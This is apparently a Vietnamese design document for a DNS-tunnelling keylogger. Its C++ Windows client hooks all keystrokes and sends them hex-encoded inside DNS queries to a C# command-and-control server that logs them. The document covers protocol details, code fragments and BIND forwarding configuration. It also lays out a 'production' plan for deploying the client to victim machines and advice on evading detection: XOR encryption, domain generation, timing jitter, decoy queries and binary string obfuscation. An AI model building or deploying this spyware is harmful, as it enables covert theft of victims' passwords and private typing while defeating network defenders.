# DNS TUNNELING KEYLOGGER - KIEN TRUC VA HOAT DONG

## 1. TONG QUAN PROJECT

### 1.1. Mo ta chung
Project nay la he thong keylogger su dung ky thuat DNS Tunneling de truyen du lieu tu Client (may bi kiem soat) den Server (may dieu khien C&C). DNS Tunneling la ky thuat che giau du lieu ben trong cac truy van DNS de vuot qua firewall va cac he thong bao mat.

### 1.2. Thanh phan chinh
- Client: Ung dung C++ chay tren Windows, capture keystroke va gui qua DNS
- Server: Ung dung C# voi GUI, dong vai tro Authoritative DNS Server nhan va decode du lieu
- Protocol: Custom protocol su dung DNS A record query/response

### 1.3. Cong nghe su dung
Client:
- Ngon ngu: C++ (Visual Studio)
- API: Windows Hook API (WH_KEYBOARD_LL), Windows DNS API (windns.h)
- Threading: Windows CreateThread API
- Entry point: WinMain (GUI application nhung khong hien thi window)

Server:
- Ngon ngu: C# .NET 8.0 Windows Forms
- Network: UdpClient tren port 53
- Async: Task.Run() cho xu ly song song
- UI: Windows Forms voi log display va client management

---

## 2. CHE DO LOCAL TEST (HIEN TAI)

### 2.1. Kien truc tong quat

```
+-------------------+                                +-------------------+
|   CLIENT (C++)    |                                |   SERVER (C#)     |
|   127.0.0.1       |                                |   127.0.0.1:53    |
|                   |                                |                   |
| - Keyboard Hook   |    UDP DNS Query (Port 53)    | - DNS Server      |
| - Buffer (10 char)|  --------------------------->  | - Parser          |
| - Async Queue     |                                | - Logger          |
| - DNS Client      |    UDP DNS Response            | - GUI Display     |
|                   |  <---------------------------  |                   |
+-------------------+                                +-------------------+
       |                                                      |
       |                                                      |
       v                                                      v
  Capture phim                                          ./logs/*.log
  Encode hex                                            Decode ASCII
  Send qua DNS                                          Hien thi GUI
```

### 2.2. Cau hinh hien tai

Client (Network.h):
```
TARGET_DOMAIN = "example.com"
DNS_SERVER_IP = "127.0.0.1"
DNS_OPTIONS = DNS_QUERY_BYPASS_CACHE | DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE
MAX_BUFFER = 10 ky tu
```

Server (GUI Settings):
```
Port: 53 (phai chay voi Admin rights)
Domain: example.com
Server IP: 127.0.0.1
Log Path: ./logs
```

### 2.3. Cach ket noi truc tiep

Trong LOCAL TEST MODE, Client gui DNS query truc tiep den Server ma khong qua DNS Resolver trung gian:

1. Client tao PIP4_ARRAY voi server list
2. Set pSrvList->AddrArray[0] = inet_addr("127.0.0.1")
3. Goi DnsQuery_A() voi pSrvList
4. Query truc tiep den 127.0.0.1:53
5. Server nhan va tra loi ngay lap tuc

Dieu nay khac voi DNS binh thuong vi:
- Khong can DNS Resolver
- Khong truy van Root DNS hay TLD DNS
- Khong can dang ky domain
- Khong can NS records
- Chi can 2 may trong cung mang LAN

---

## 3. LUONG DU LIEU CHI TIET - LOCAL MODE

### 3.1. Khoi dong Client

File: Main.cpp - WinMain()

Buoc 1: Tao Mutex de dam bao chi 1 instance chay
```
Mutex Name: "e3a8bdf7-1c29-4f7b-a0d2-c3f5e9b08a14"
Kiem tra: GetLastError() == ERROR_ALREADY_EXISTS
Neu da co instance khac -> Thoat
```

Buoc 2: Ket noi den Server (startConnection)
```
Query: a.1.1.1.example.com
Gui den: 127.0.0.1:53
Retry: Toi da 10 lan, moi lan cach 2 giay
Response: IP address ma octet cuoi la Connection ID
Vi du: 123.45.67.5 -> Connection ID = 5
```

Buoc 3: Cai dat Keyboard Hook
```
Hook Type: WH_KEYBOARD_LL (Low-Level Keyboard Hook)
Callback: process_key()
Scope: Toan he thong (tat ca ung dung)
Keyboard Layout: GetKeyboardLayout(0) - Lay layout hien tai
```

Buoc 4: Khoi dong Sender Thread
```
Thread Function: senderThread()
Priority: Default
Muc dich: Xu ly queue va gui du lieu async
```

Buoc 5: Vao Message Loop
```
GetMessage() - Cho message tu Windows
Loop nay giu cho hook van hoat dong
Khong thoat cho den khi WM_QUIT
```

### 3.2. Capture Keystroke

File: KeyLogger.cpp - process_key()

Buoc 1: Nhan WM_KEYDOWN event
```
Event nay duoc Windows gui moi khi co phim duoc nhan
nCode: HC_ACTION (0) - Event hop le
wParam: WM_KEYDOWN - Phim dang duoc nhan xuong
lParam: Con tro den KBDLLHOOKSTRUCT
```

Buoc 2: Lay trang thai ban phim
```
GetKeyState(VK_SHIFT) - Update trang thai Shift
GetKeyboardState(keyboardState) - Lay trang thai tat ca phim
keyboardState[256] chua trang thai moi phim (down/up/toggled)
```

Buoc 3: Convert Virtual Key Code sang ASCII
```
ToAsciiEx(
  vkCode: Ma phim ao (VK_A, VK_1, VK_RETURN, ...)
  scanCode: Hardware scan code
  keyboardState: Trang thai Shift/Ctrl/Alt
  translatedChar: Output buffer
  flags: 0
  keyboardLayout: Layout ban phim hien tai
)

Ket qua:
- result = 1: Co 1 ky tu ASCII
- result = 0: Khong co ky tu (phim dac biet)
- result < 0: Dead key (dau thanh tieng Viet)
```

Buoc 4: Filter ky tu hop le
```
Chi chap nhan ky tu ASCII printable: 32-126
32 = Space
33-47 = Ky tu dac biet (!@#$%^&*()...)
48-57 = So (0-9)
65-90 = Chu hoa (A-Z)
97-122 = Chu thuong (a-z)
126 = ~

Ly do filter:
- Tranh ky tu dieu khien (0-31)
- Tranh ky tu mo rong (127-255) - gay loi decode
- Dam bao du lieu la ASCII sach
```

Buoc 5: Them vao buffer
```
keystrokeBuffer += keyChar
Khi keystrokeBuffer.size() >= MAX_BUFFER (10):
  - Lock mutex
  - Push vao sendQueue
  - Clear buffer
  - Unlock mutex
```

CHU Y QUAN TRONG:
```
Ham process_key() PHAI NHANH (< 1ms)
Neu cham: Windows se skip keystroke hoac unhook
Khong duoc:
  - Goi std::cout (blocking I/O)
  - Goi sendData() (network blocking)
  - Sleep() hoac wait
  - Xu ly phuc tap
Chi duoc:
  - Capture ky tu
  - Them vao buffer
  - Push queue khi day
```

### 3.3. Gui du lieu qua DNS

File: KeyLogger.cpp - senderThread()

Thread nay chay doc lap, lien tuc kiem tra queue va gui du lieu.

Buoc 1: Kiem tra queue
```
while (!shouldStopSender):
  Lock queueMutex
  If sendQueue not empty:
    dataToSend = sendQueue.front()
    sendQueue.pop()
  Unlock queueMutex
```

Buoc 2: Neu co du lieu -> Gui
```
sendData(
  connectionId: ID nhan duoc tu startConnection
  packetNumber: Tang dan 0->999 roi reset
  domain: "example.com"
  data: Chuoi 10 ky tu can gui
)

Sau khi gui thanh cong:
  packetNumber++
  if (packetNumber > 999) packetNumber = 0
```

Buoc 3: Neu queue rong -> Sleep
```
Sleep(100) - Ngu 100ms de tranh busy-waiting
Tiet kiem CPU khi khong co du lieu
```

File: Network.cpp - sendData()

Buoc 1: Encode du lieu sang hex
```
convertToHex("Hello World")
=> "48656c6c6f20576f726c64"

Cach encode:
- Moi byte (char) -> 2 hex digits
- Byte 'H' (72) -> "48"
- Byte 'e' (101) -> "65"
- Vv...
```

Buoc 2: Tao DNS query name
```
Format: b.{packetNumber}.{connectionId}.{hexData}.{domain}

Vi du:
  packetNumber = 0
  connectionId = 5
  hexData = "48656c6c6f20576f726c64"
  domain = "example.com"

Query name: b.0.5.48656c6c6f20576f726c64.example.com
```

Buoc 3: Thuc hien DNS query
```
DnsQuery_A(
  pOwnerName: "b.0.5.48656c6c6f20576f726c64.example.com"
  wType: DNS_TYPE_A (1) - Truy van dia chi IP
  dwOptions: DNS_QUERY_BYPASS_CACHE | DNS_QUERY_ACCEPT_TRUNCATED_RESPONSE
  pSrvList: {127.0.0.1} - Gui truc tiep den server
  ppQueryResults: &pDnsRecord - Output buffer
  pReserved: NULL
)
```

Buoc 4: Retry logic
```
Retry toi da 3 lan
Moi lan cach nhau 200ms

Neu thanh cong -> Parse response IP
Neu that bai -> Sleep(200) va retry
```

Buoc 5: Parse response IP
```
Response IP format: {code}.{random}.{random}.{random}

Vi du: 200.123.45.67
  Octet dau: 200 = Response code

Response codes:
  200 (OK) -> Du lieu da duoc xu ly thanh cong
  201 (MALFORMED) -> Goi tin sai format
  202 (NX) -> Connection khong ton tai -> Reconnect
  203 (OOO) -> Packet khong dung thu tu -> Reset packet number
  204 (MAX) -> Server da day (254 connections)
```

### 3.4. Server nhan va xu ly

File: ServerLogic.cs - ListenForQueries()

Server chay loop async de nhan UDP packets:

```
while (_isRunning):
  result = await _udpServer.ReceiveAsync()
  Task.Run(() => ProcessQuery(result.Buffer, result.RemoteEndPoint))
```

Moi packet duoc xu ly tren thread rieng de server van co the nhan packet moi.

File: ServerLogic.cs - ProcessQuery()

Buoc 1: Parse DNS query header
```
ParseDNSQuery(data):
  - Transaction ID: 2 bytes dau
  - Query Name: Bat dau tu byte 12
  - Query Type: 2 bytes sau query name
  - Query Class: 2 bytes tiep theo
```

Buoc 2: Extract subdomain data
```
GetData(queryName, domain):
  Query: b.0.5.48656c6c6f20576f726c64.example.com
  Domain: example.com
  
  Kiem tra:
    1. Query co ket thuc bang domain khong?
    2. So dau cham co dung khong? (domain_dots + 4)
    3. Vi du: example.com co 1 dau cham
       => Query phai co 5 dau cham (1+4)
  
  IndexOfSecondDot():
    Tim dau cham thu 2 tu ben phai
    example.com -> Vi tri sau "example"
    Return: "b.0.5.48656c6c6f20576f726c64"
```

Buoc 3: Phan loai packet

TYPE A - Connection Request:
```
Query: a.1.1.1.example.com
Extract: "a.1.1.1"
Split: ["a", "1.1.1"]
Type: "a"

Xu ly:
  1. Tao DataParser moi cho client
  2. Them vao _dataParsers list
  3. Tao ClientInfo voi connection ID
  4. Fire event OnClientAdded -> Update GUI
  5. Tao response IP: {random}.{random}.{random}.{connectionID+1}
  6. Gui DNS response voi IP nay
```

TYPE B - Data Packet:
```
Query: b.0.5.48656c6c6f20576f726c64.example.com
Extract: "b.0.5.48656c6c6f20576f726c64"
Split: ["b", "0.5.48656c6c6f20576f726c64"]
Type: "b"

Xu ly:
  1. ParseData("0.5.48656c6c6f20576f726c64")
  2. Split thanh 3 phan: ["0", "5", "48656c6c6f20576f726c64"]
     - packetNumber = 0
     - connectionId = 5
     - hexData = "48656c6c6f20576f726c64"
  3. Validate: connectionId co ton tai khong?
  4. Decode hex -> byte array
  5. Decode byte array -> ASCII string
  6. parser.AddData() - Kiem tra thu tu packet
  7. Fire event OnDataReceived -> Update GUI
  8. Tao response IP: 200.{random}.{random}.{random}
  9. Gui DNS response
```

Buoc 4: Kiem tra loi

DuplicatePacketException:
```
Packet number trung voi packet truoc
=> Ignore, gui response rong
```

OutOfOrderException:
```
Packet number khong tang dan
Vi du: Nhan packet 5 sau do nhan packet 3
=> Reset LastReceivedPacket = 0
=> Gui response code 203 (OOO)
=> Client se reset packet number
```

NXConnectionException:
```
Connection ID khong ton tai
Vi du: Client gui connectionId=10 nhung chi co 3 connections
=> Gui response code 202 (NX)
=> Client se reconnect
```

DNSSyntaxException:
```
Format packet sai
Vi du: Thieu dau cham, hex data le ky tu
=> Gui response code 201 (MALFORMED)
```

Buoc 5: Luu log

DataParser.SaveToFile():
```
Duong dan: ./logs/client_{id}_{ip}_{timestamp}.log
Encoding: ASCII
Noi dung: Tat ca keystroke da decode

Vi du:
./logs/client_1_127.0.0.1_1760465326.log
Noi dung: "Hello World this is a test message"
```

### 3.5. Dong bo va threading

Client Threading Model:
```
Main Thread:
  - WinMain() entry point
  - Message loop (GetMessage)
  - Giu hook active

Hook Callback Thread:
  - process_key() duoc Windows goi tren thread rieng
  - Chi them vao buffer
  - PHAI nhanh < 1ms

Sender Thread:
  - senderThread() chay doc lap
  - Xu ly queue
  - Gui DNS queries
  - Co the cham (network I/O)
```

Synchronization:
```
queueMutex: Bao ve sendQueue
  - Lock truoc khi push (hook callback)
  - Lock truoc khi pop (sender thread)

shouldStopSender: Atomic flag
  - Set = true khi cleanup
  - Sender thread kiem tra va thoat
```

Server Threading Model:
```
Main Thread:
  - GUI (Windows Forms)
  - Event handlers
  - Start/Stop buttons

Listener Thread:
  - ListenForQueries() - Async loop
  - await ReceiveAsync() - Non-blocking
  - Nhan UDP packets

Worker Threads:
  - Task.Run(() => ProcessQuery())
  - Moi packet duoc xu ly tren thread rieng
  - Song song, khong block listener

GUI Update:
  - Events: OnLogMessage, OnClientAdded, OnDataReceived
  - Fire events tu worker threads
  - GUI thread lang nghe events va update UI
```

---

## 4. CHE DO PRODUCTION (TUONG LAI)

### 4.1. Kien truc tong quat Production

```
+----------------+       +-----------------+       +------------------+       +------------------+
| CLIENT         |       | SYSTEM DNS      |       | DNS RESOLVER     |       | C&C SERVER       |
| (May bi tan    |       | (ISP hoac 8.8.8)|       | (BIND/Unbound)   |       | (Authoritative)  |
| cong)          |       |                 |       |                  |       |                  |
+----------------+       +-----------------+       +------------------+       +------------------+
       |                         |                         |                         |
       | 1. Query:               |                         |                         |
       | a.1.1.1.example.com     |                         |                         |
       |------------------------>|                         |                         |
       |                         |                         |                         |
       |                         | 2. Recursive query      |                         |
       |                         |------------------------>|                         |
       |                         |                         |                         |
       |                         |                         | 3. Check cache          |
       |                         |                         | Cache miss              |
       |                         |                         |                         |
       |                         |                         | 4. Check zone config    |
       |                         |                         | example.com -> forward  |
       |                         |                         |                         |
       |                         |                         | 5. Forward query        |
       |                         |                         |------------------------>|
       |                         |                         |                         |
       |                         |                         |                         | 6. Parse query
       |                         |                         |                         | Create connection
       |                         |                         |                         | Generate fake IP
       |                         |                         |                         |
       |                         |                         | 7. Response: 45.67.89.1 |
       |                         |                         |<------------------------|
       |                         |                         |                         |
       |                         |                         | 8. Cache result (TTL)   |
       |                         |                         |                         |
       |                         | 9. Response: 45.67.89.1 |                         |
       |                         |<------------------------|                         |
       |                         |                         |                         |
       | 10. Response: 45.67.89.1|                         |                         |
       |<------------------------|                         |                         |
       |                         |                         |                         |
       | 11. Parse IP            |                         |                         |
       | Connection ID = 1       |                         |                         |
       |                         |                         |                         |
```

### 4.2. Cac thanh phan Production

THANH PHAN 1: Domain Registration
```
Can mua domain that: example.com
Registrar: GoDaddy, Namecheap, CloudFlare, v.v.

Cau hinh NS Records tai Registrar:
  Nameserver 1: ns1.example.com -> 203.0.113.10
  Nameserver 2: ns2.example.com -> 203.0.113.10
  (203.0.113.10 la IP cua C&C Server)

Propagation time: 24-48 gio de DNS global cap nhat
```

THANH PHAN 2: DNS Resolver Server
```
Vai tro: Trung gian giua Client va C&C Server

Chon phan mem:
  - BIND9 (pho bien nhat)
  - Unbound (nhe, bao mat cao)
  - PowerDNS
  - Custom implementation

Chuc nang:
  1. Nhan recursive queries tu clients
  2. Kiem tra cache
  3. Forward queries cho *.example.com den C&C Server
  4. Forward queries khac den internet (1.1.1.1, 8.8.8.8)
  5. Cache responses theo TTL
  6. Tra loi cho clients
```

Cau hinh BIND9 Production:
```
File: /etc/bind/named.conf.options

options {
    directory "/var/cache/bind";
    recursion yes;
    allow-query { any; };
    
    forwarders {
        1.1.1.1;
        8.8.8.8;
    };
    
    forward first;
    dnssec-validation auto;
};

File: /etc/bind/named.conf.local

zone "example.com" {
    type forward;
    forwarders { 203.0.113.10; };
    forward only;
};
```

THANH PHAN 3: C&C Server (Authoritative DNS)
```
Vai tro: Authoritative nameserver cho example.com

Yeu cau:
  - VPS/Server voi IP public: 203.0.113.10
  - Port 53 UDP open
  - Chay voi admin rights
  - Stable connection
  
Chuc nang:
  1. Tra loi NS queries cho example.com
  2. Tra loi SOA queries
  3. Tra loi A queries cho *.example.com
  4. Xu ly keylogger protocol (a.*, b.*)
  5. Luu log keystroke
```

THANH PHAN 4: Client Configuration
```
Co 2 cach deploy:

OPTION 1: Hard-code DNS Resolver IP
  Network.h:
    inline const char* DNS_SERVER_IP = "192.168.1.100";
  
  Network.cpp:
    pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
    DnsQuery_A(..., pSrvList, ...);
  
  Uu diem: Client luon query Resolver cua minh
  Nhuoc diem: Phai change DNS setting cua victim

OPTION 2: Su dung System DNS
  Network.cpp:
    DnsQuery_A(..., nullptr, ...);
  
  Uu diem: Khong can change DNS setting
  Nhuoc diem: Phai doi domain propagate toan cau (24-48h)
```

### 4.3. Luong DNS Resolution Production

BUOC 1: Client send initial query
```
Client goi: DnsQuery_A("a.1.1.1.example.com", ..., nullptr, ...);
Windows OS:
  1. Check hosts file (C:\Windows\System32\drivers\etc\hosts)
  2. Check DNS cache
  3. Neu cache miss -> Query System DNS
```

BUOC 2: Query System DNS (ISP DNS hoac 8.8.8.8)
```
System DNS nhan query: a.1.1.1.example.com

Check cache:
  - Neu co cache hit -> Tra loi ngay
  - Neu cache miss -> Recursive query
  
Recursive query:
  1. Query Root DNS servers (.) -> Tra loi .com TLD servers
  2. Query .com TLD servers -> Tra loi ns1.example.com, ns2.example.com
  3. Query ns1.example.com (203.0.113.10) -> Authoritative answer
```

BUOC 3: DNS Resolver nhan query (neu dung Option 1)
```
DNS Resolver (192.168.1.100) nhan: a.1.1.1.example.com

Check cache:
  - TTL con hieu luc? -> Tra loi cache
  - TTL het han hoac cache miss -> Forward

Check zone config:
  zone "example.com" { type forward; forwarders { 203.0.113.10; }; }
  
Forward query:
  Query 203.0.113.10:53 voi query name: a.1.1.1.example.com
```

BUOC 4: C&C Server (Authoritative) xu ly
```
ServerLogic.cs - ProcessQuery():

1. Parse DNS query
2. Extract: "a.1.1.1"
3. Determine type: "a" = Connection request
4. Tao connection moi
5. Generate fake IP: 45.67.89.1 (last octet = connectionID)
6. Tao DNS response packet:
   - Transaction ID: Copy from query
   - Flags: QR=1 (response), AA=1 (authoritative answer)
   - Answer section: A record -> 45.67.89.1
   - TTL: 60 seconds
7. Send UDP response ve DNS Resolver
```

BUOC 5: DNS Resolver cache va forward
```
Resolver nhan response: 45.67.89.1

Cache entry:
  Name: a.1.1.1.example.com
  Type: A
  Data: 45.67.89.1
  TTL: 60 seconds
  Expiry: Current time + 60s

Forward response ve System DNS (hoac Client)
```

BUOC 6: System DNS cache va tra loi Client
```
System DNS nhan response: 45.67.89.1

Cache entry (tuong tu Resolver)

Tra loi ve Client OS
```

BUOC 7: Client parse response
```
Network.cpp - startConnection():

Parse response IP: 45.67.89.1
lastDot = rfind(".") -> Position of last dot
Extract last octet: "1"
connectionId = stoi("1") = 1

Return connectionId = 1
```

### 4.4. Caching behavior Production

DNS caching co impact lon den performance va stealth:

LOCAL TEST (hien tai):
```
DNS_QUERY_BYPASS_CACHE: Moi query deu hit server
Khong co cache -> Tat ca query den server
```

PRODUCTION with caching:
```
Lan 1: Client query a.1.1.1.example.com
  -> Cache miss tren tat ca layers
  -> Query hit C&C Server
  -> Response: 45.67.89.1
  -> Cache tren Resolver (TTL 60s)
  -> Cache tren System DNS (TTL 60s)
  -> Cache tren Client OS (TTL 60s)

Lan 2: Client query a.1.1.1.example.com (trong 60s)
  -> Cache hit tren Client OS
  -> Response: 45.67.89.1 (instant, khong query network)
  
Sau 60s: Cache expiry
  -> Query lai toan bo chain
```

Anh huong:
```
Positive:
  - Giam query den server (stealth tot hon)
  - Tang toc do response
  - Giam bandwidth

Negative:
  - Reconnection sau 60s se re-use cache -> Fail
  - Phai doi cache expiry de reconnect
  - Co the gay confusion trong development
```

### 4.5. Code changes can thiet cho Production

CLIENT Changes:

File: Network.h
```
// Comment out local test mode
// inline const char* DNS_SERVER_IP = "127.0.0.1";

// Uncomment production mode
inline const char* DNS_SERVER_IP = "192.168.1.100";

// Hoac de nullptr de dung System DNS
// #define USE_SYSTEM_DNS
```

File: Network.cpp - startConnection() va sendData()
```
#ifdef USE_SYSTEM_DNS
    DNS_STATUS status = DnsQuery_A(
        pOwnerName,
        wType,
        DNS_OPTIONS,
        nullptr,
        &pDnsRecord,
        nullptr
    );
#else
    PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
    pSrvList->AddrCount = 1;
    pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
    
    DNS_STATUS status = DnsQuery_A(
        pOwnerName,
        wType,
        DNS_OPTIONS,
        pSrvList,
        &pDnsRecord,
        nullptr
    );
    
    LocalFree(pSrvList);
#endif
```

SERVER Changes:

File: ServerLogic.cs - Start()
```
LogMessage("[MODE] PRODUCTION - Via DNS Resolver");
LogMessage($"[Public IP] {_serverIp}");
LogMessage($"[NS Records]");
LogMessage($"  ns1.{_domain} -> {_serverIp}");
LogMessage($"  ns2.{_domain} -> {_serverIp}");
LogMessage("[DNS Resolution Path]");
LogMessage("  Client -> System DNS -> DNS Resolver -> This Server");
```

File: ServerLogic.cs - HandleNormalDNSQuery()
```
Production can tra loi day du cac loai query:

NS Query (Type 2):
  Query: example.com NS?
  Response: ns1.example.com, ns2.example.com

SOA Query (Type 6):
  Query: example.com SOA?
  Response:
    Primary NS: ns1.example.com
    Admin email: admin@example.com
    Serial: 2024101501
    Refresh: 3600
    Retry: 600
    Expire: 86400
    Minimum TTL: 60

A Query for NS records:
  Query: ns1.example.com A?
  Response: 203.0.113.10
  
  Query: ns2.example.com A?
  Response: 203.0.113.10
```

### 4.6. Testing Production Setup

TEST 1: Test NS Records propagation
```
Command: nslookup -type=ns example.com
Expected output:
  Server: 8.8.8.8
  Address: 8.8.8.8#53
  
  example.com nameserver = ns1.example.com
  example.com nameserver = ns2.example.com

Command: nslookup ns1.example.com
Expected output:
  Server: 8.8.8.8
  Address: 8.8.8.8#53
  
  Name: ns1.example.com
  Address: 203.0.113.10
```

TEST 2: Test DNS Resolver forwarding
```
On Resolver machine:
Command: tail -f /var/log/syslog | grep named

Expected logs:
  client 192.168.1.50#54321: query: a.1.1.1.example.com IN A
  forwarder 203.0.113.10: response: 45.67.89.1
```

TEST 3: Test C&C Server query handling
```
On Server machine:
Open Server GUI -> Start server

From client machine:
Command: nslookup a.1.1.1.example.com 203.0.113.10

Expected:
  Server: 203.0.113.10
  Address: 203.0.113.10#53
  
  Name: a.1.1.1.example.com
  Address: 45.67.89.1

Server GUI should show:
  [Query] a.1.1.1.example.com from <client_ip>
  [Connect] Starting connection #1
```

TEST 4: Test end-to-end keylogger
```
1. Start Server on VPS (203.0.113.10)
2. Configure DNS Resolver to forward example.com
3. Deploy Client to victim machine
4. Client should auto-connect
5. Type keys on victim machine
6. Server should receive and decode keystrokes
7. Check ./logs/ for log files
```

---

## 5. BAO MAT VA STEALTH

### 5.1. Diem yeu hien tai (Local Test)

1. Traffic hien nhien:
```
DNS queries chua hex data trong subdomain
Vi du: b.0.1.48656c6c6f.example.com
De dang detect bang:
  - Subdomain length analysis
  - Hex pattern detection
  - Query frequency analysis
```

2. Khong co encryption:
```
Keystroke data la plaintext hex
Neu capture packets -> de dang decode
```

3. Predictable pattern:
```
Fixed domain: example.com
Fixed query format: a.1.1.1, b.{num}.{id}.{hex}
De dang viet IDS signature
```

### 5.2. Cai tien cho Production

ENCRYPTION:
```
Client - Network.cpp - convertToHex():

Before:
  "Hello" -> "48656c6c6f"

After (voi XOR encryption):
  key = 0xAA
  "Hello" -> XOR voi 0xAA -> Encrypt -> Hex
  "Hello" -> [0xE2, 0xCF, 0xC6, 0xC6, 0xC5] -> "e2cfc6c6c5"

Server - ServerLogic.cs - ParseData():
  hexData -> Decode hex -> XOR voi 0xAA -> Plaintext
```

DOMAIN GENERATION ALGORITHM (DGA):
```
Thay vi fixed "example.com", generate domain theo thoi gian:

Algorithm:
  seed = current_date (YYYYMMDD)
  domain = hash(seed) + ".com"
  
Vi du:
  2024-10-15 -> hash -> "a3f5b2c1.com"
  2024-10-16 -> hash -> "d4e6a8b3.com"

Client va Server dung cung algorithm -> Dong bo domain
Outsider khong biet algorithm -> Khong biet domain nao dang dung
```

RANDOM DELAYS:
```
KeyLogger.cpp - senderThread():

Them jitter:
  int delay = 100 + (rand() % 200);
  Sleep(delay);

Muc dich:
  - Tranh predictable timing
  - Harder to detect bang timing analysis
```

TRAFFIC OBFUSCATION:
```
Them fake queries:
  - Query domains hop le (google.com, facebook.com)
  - Mix voi keylogger queries
  - Ratio: 5 fake queries : 1 real query
  - Harder to filter signal from noise
```

---

## 6. TROUBLESHOOTING

### 6.1. Loi thuong gap - Local Test

LOI 1: "Connection failed after 10 attempts"
```
Nguyen nhan:
  - Server chua chay
  - Firewall block port 53
  - Server khong chay voi Admin rights

Giai quyet:
  1. Check Server GUI - Nut "Start" da nhan chua?
  2. Check Windows Firewall:
     - Control Panel -> Firewall -> Allow app
     - Them Server.exe vao whitelist
  3. Run Server as Administrator
  4. Check port 53:
     Command: netstat -ano | findstr :53
     Neu co process khac -> Kill hoac doi port
```

LOI 2: "Hook installation failed"
```
Nguyen nhan:
  - Client khong chay voi Admin rights
  - Da co instance khac dang chay

Giai quyet:
  1. Run Client as Administrator
  2. Check Task Manager -> Chi duoc 1 Client.exe
  3. Kill cac process Client.exe cu
  4. Delete mutex (restart may neu can)
```

LOI 3: "Keystroke khong hien thi tren Server"
```
Nguyen nhan:
  - Buffer chua day (< 10 ky tu)
  - Network blocked
  - Encoding/decoding loi

Debug:
  1. Go it nhat 10 ky tu
  2. Check Server logs - Co nhan query khong?
  3. Check hex encoding - Co hop le khong?
  4. Restart ca Client va Server
```

LOI 4: "Ky tu bi sai/thieu"
```
Nguyen nhan:
  - Hook callback qua cham (bi skip keystroke)
  - Non-ASCII characters

Giai quyet:
  - Da duoc fix: Async queue + filter ASCII 32-126
  - Neu van bi -> Tang MAX_BUFFER len 20
```

### 6.2. Loi thuong gap - Production

LOI 1: "NS records not found"
```
Nguyen nhan:
  - Domain chua propagate
  - NS records cau hinh sai

Giai quyet:
  1. Doi 24-48 gio cho propagation
  2. Check propagation:
     Website: whatsmydns.net
     Nhap: example.com, Type: NS
     Xem co NS records toan cau khong
  3. Check registrar settings
```

LOI 2: "DNS Resolver khong forward"
```
Nguyen nhan:
  - BIND config sai
  - Firewall block port 53
  - C&C Server khong reachable

Debug:
  1. Check BIND logs:
     tail -f /var/log/syslog | grep named
  2. Test forward manually:
     dig @203.0.113.10 a.1.1.1.example.com
  3. Check firewall:
     ufw status
     iptables -L
```

LOI 3: "Client khong ket noi duoc"
```
Nguyen nhan:
  - DNS resolution fail
  - C&C Server down
  - Network blocked

Debug Client side:
  1. Test DNS resolution:
     nslookup a.1.1.1.example.com
     Phai tra ve IP address
  2. Test connectivity:
     ping ns1.example.com
  3. Check DNS setting:
     ipconfig /all
     DNS Servers phai dung
```

---

## 7. SO SANH LOCAL VA PRODUCTION

| Khac biet              | Local Test Mode                  | Production Mode                           |
|------------------------|----------------------------------|-------------------------------------------|
| Ket noi                | Truc tiep 127.0.0.1:53          | Qua DNS Resolver va DNS hierarchy         |
| Domain                 | Bat ky (example.com)             | Domain that da dang ky                    |
| NS Records             | Khong can                        | Phai cau hinh tai registrar               |
| DNS Resolver           | Khong can                        | Phai setup BIND/Unbound                   |
| Public IP              | Khong can                        | Can VPS voi IP public                     |
| Firewall               | Local firewall                   | VPS firewall + ISP firewall               |
| Caching                | Bypass cache                     | Cache tren nhieu layer                    |
| Latency                | < 1ms                            | 50-500ms (tuy network)                    |
| Detection risk         | Khong co                         | IDS/IPS, firewall, DNS monitoring         |
| Scale                  | 1-2 machines                     | Unlimited clients                         |
| Setup time             | 5 phut                           | 2-3 ngay (domain propagation)             |
| Cost                   | Mien phi                         | Domain ($10/nam) + VPS ($5/thang)         |

---

## 8. PERFORMANCE VA LIMITATIONS

### 8.1. Performance Metrics

Client:
```
Hook overhead: < 0.1ms per keystroke
Buffer flush: Moi 10 ky tu = 1 DNS query
Encoding: 10 bytes -> 20 hex chars
Max query length: ~250 chars (subdomain limit)
Thread overhead: 2 threads (hook + sender)
Memory: ~5MB RAM
CPU: < 1% khi idle, < 5% khi typing nhanh
```

Server:
```
Concurrent connections: Toi da 254 (vi Connection ID = 1 byte)
Queries per second: ~1000 (single-threaded UDP)
Parse overhead: ~1ms per query
Memory per connection: ~10KB
Total memory: ~50MB cho 254 connections
CPU: < 10% voi 10 clients typing
```

Network:
```
Bandwidth per keystroke: ~100 bytes (DNS query + response)
10 keystrokes = ~1KB
100 keystrokes/phut = ~10KB/phut = ~600KB/gio
24h continuous typing = ~14.4MB/ngay
```

### 8.2. Limitations

Technical:
```
1. DNS subdomain length limit: 253 characters
   => Max data per query: ~120 bytes
   => Neu data dai -> Phai split thanh nhieu packets

2. Connection ID limit: 1 byte = 254 connections max
   => Neu can nhieu hon -> Phai mo rong protocol

3. Packet number limit: 0-999
   => Sau 999 packets -> Reset ve 0
   => Co the gay confusion neu co packets lost

4. ASCII only: Chi capture ky tu ASCII 32-126
   => Ky tu Unicode, emoji khong duoc capture

5. Buffer size: 10 characters
   => Neu go cham (< 10 chars) -> Data khong duoc gui
   => Can them timeout mechanism
```

Protocol:
```
1. Khong co acknowledgment:
   => Neu packet lost -> Mat du lieu vinh vien
   => Can them retry logic phuc tap hon

2. Khong co error correction:
   => Neu byte loi trong transmission -> Decode sai
   => Can them checksum hoac CRC

3. Khong co encryption:
   => Traffic la plaintext
   => De bi intercept

4. Predictable pattern:
   => De bi IDS detect
   => Can obfuscation
```

---

## 9. BEST PRACTICES

### 9.1. Development

1. Luon test Local truoc khi Production
2. Su dung version control (Git)
3. Backup code truoc khi thay doi lon
4. Document moi thay doi
5. Test tren nhieu Windows versions (7, 10, 11)
6. Test voi cac keyboard layouts khac nhau
7. Monitor performance (CPU, Memory, Network)

### 9.2. Deployment

1. Thay doi TARGET_DOMAIN trong code
2. Change Mutex GUID de tranh conflict
3. Test ket noi truoc khi deploy mass
4. Monitor server logs de detect loi
5. Setup backup server neu main server down
6. Co fallback communication channel (HTTP, HTTPS)

### 9.3. Security

1. Them encryption layer (XOR hoac AES)
2. Implement DGA de hide domain
3. Su dung HTTPS tunneling neu DNS bi block
4. Them traffic obfuscation
5. Monitor IDS logs de adjust behavior
6. Khong hard-code sensitive info
7. Obfuscate strings trong binary

---

## 10. FUTURE IMPROVEMENTS

